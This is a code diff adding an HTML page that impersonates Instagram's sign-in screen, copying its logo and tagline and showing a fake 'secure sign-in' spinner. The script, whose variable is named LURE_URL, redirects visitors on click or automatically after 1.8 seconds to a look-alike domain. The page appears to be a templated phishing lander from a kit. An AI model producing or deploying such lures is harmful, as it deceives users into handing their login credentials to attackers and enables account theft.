@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
+    .card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px 36px 32px;width:100%;max-width:400px;text-align:center}
+    .logo{margin-bottom:24px;display:flex;align-items:center;justify-content:center}
+    .tagline{color:#666;font-size:15px;margin-bottom:28px;line-height:1.4}
+    .btn{display:block;width:100%;padding:12px;background:#E1306C;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:opacity .2s}
+    .btn:hover{opacity:.88}
+    .spinner{width:36px;height:36px;border:3px solid #eee;border-top:3px solid #E1306C;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading{display:none}
+    .loading p{color:#888;font-size:14px;margin-top:8px}
+    footer{margin-top:24px;color:#999;font-size:12px}
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><radialGradient id="ig" cx="19.38" cy="42.035" r="44.899" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fd5"/><stop offset=".328" stop-color="#ff543f"/><stop offset=".348" stop-color="#fc5245"/><stop offset=".504" stop-color="#e64771"/><stop offset=".643" stop-color="#d53e91"/><stop offset=".761" stop-color="#cc39a4"/><stop offset=".841" stop-color="#c837ab"/></radialGradient><path fill="url(#ig)" d="M34.017 41.99l-20 .019c-4.4.004-8.003-3.592-8.008-7.992l-.019-20c-.004-4.4 3.592-8.003 7.992-8.008l20-.019c4.4-.004 8.003 3.592 8.008 7.992l.019 20c.005 4.401-3.592 8.004-7.992 8.008z"/><path fill="#fff" d="M24 31c-3.859 0-7-3.14-7-7s3.141-7 7-7 7 3.14 7 7-3.141 7-7 7zm0-12c-2.757 0-5 2.243-5 5s2.243 5 5 5 5-2.243 5-5-2.243-5-5-5zm6.5-3c-.828 0-1.5.671-1.5 1.5s.672 1.5 1.5 1.5 1.5-.671 1.5-1.5-.672-1.5-1.5-1.5z"/></svg></div>
+    <p class="tagline">Sign in to see photos and videos from your friends.</p>
+    <a class="btn" id="btn" href="#">Sign in</a>
+  </div>
+  <div class="card loading" id="loading">
+    <div class="spinner"></div>
+    <p>Redirecting to secure sign-in&hellip;</p>
+  </div>
+  <footer>Secure connection &bull; Privacy Policy</footer>
+  <script>
+    var LURE_URL = 'https://www.instagram2026.authenticationsession.online/bcbkhgIS'; /* AUTO_LURE_URL */
+    document.getElementById('btn').href = LURE_URL;
+    document.getElementById('btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    });
+    // Auto-redirect after 1.8s if user doesn't click
+    setTimeout(function(){
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    }, 1800);
+  </script>
+</body>
+</html>
